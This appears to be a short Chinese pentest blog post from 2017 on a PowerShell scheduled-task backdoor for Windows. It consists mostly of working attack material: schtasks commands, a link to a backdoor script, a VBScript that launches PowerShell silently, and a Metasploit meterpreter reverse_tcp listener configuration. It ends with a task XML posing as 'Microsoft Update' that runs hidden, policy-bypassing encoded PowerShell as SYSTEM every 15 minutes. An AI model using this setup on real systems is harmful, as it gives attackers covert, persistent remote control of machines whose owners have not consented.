Title: powershell定时任务后门
Category: Pentest
Date: 2017-5-24
slug: power-schtask-backdoor

windows下查询定时任务，会出现无法加载列资源的情况：

<https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1>

```
chcp 437  //cmd执行之后，切换到英文的cmd
```

```
schtasks /query  //列出所有task
schtasks /query /xml  //列出所有xml文件格式的定时任务
schtasks /query /xml /TN 'name' //列出某个任务的详细信息（TN: TaskName)
schtasks /delete /TN  "name" //删除某个定时任务，这个名字可以再query的时候找到, /f 强制删除
```


一种是定时任务，但是执行powershell的时候会弹窗
<https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work>

https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/
设置userid   <UserId>NT AUTHORITY\SYSTEM</UserId> 即可
```
Dim shell,command
command = "powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1"
set shell = CreateObject("WScript.Shell")
shell.Run command,0
```

msf接收多个shell可以如下这样做：

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.117
set LPORT 31337
set ExitOnSession false
exploit -j -z

或者上面的保存为listener.rc，然后msfconsole启动
msfconsole -r ./listener.rc
```

XML文件如下:

```
<!-- \Microsoft Update -->

<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">

  <RegistrationInfo>

    <Date>2016-05-25T11:22:53</Date>

    <Author>Microsoft Update</Author>

  </RegistrationInfo>

  <Triggers>

    <TimeTrigger>

      <Repetition>

        <Interval>PT15M</Interval>

        <StopAtDurationEnd>false</StopAtDurationEnd>

      </Repetition>

      <StartBoundary>2017-05-30T18:22:52</StartBoundary>

      <Enabled>true</Enabled>

    </TimeTrigger>

  </Triggers>

  <Principals>

    <Principal id="Author">

      <UserId>NT AUTHORITY\SYSTEM</UserId>

      <LogonType>InteractiveToken</LogonType>

      <RunLevel>LeastPrivilege</RunLevel>

    </Principal>

  </Principals>

  <Settings>

    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>

    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>

    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>

    <AllowHardTerminate>true</AllowHardTerminate>

    <StartWhenAvailable>false</StartWhenAvailable>

    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>

    <IdleSettings>

      <StopOnIdleEnd>true</StopOnIdleEnd>

      <RestartOnIdle>false</RestartOnIdle>

    </IdleSettings>

    <AllowStartOnDemand>true</AllowStartOnDemand>

    <Enabled>true</Enabled>

    <Hidden>false</Hidden>

    <RunOnlyIfIdle>false</RunOnlyIfIdle>

    <WakeToRun>false</WakeToRun>

    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>

    <Priority>7</Priority>

  </Settings>

  <Actions Context="Author">

    <Exec>

      <Command>powershell.exe</Command>

      <Arguments>-exec bypass -nop -WindowStyle hidden -e [payload]</Arguments>

    </Exec>

  </Actions>

</Task>
```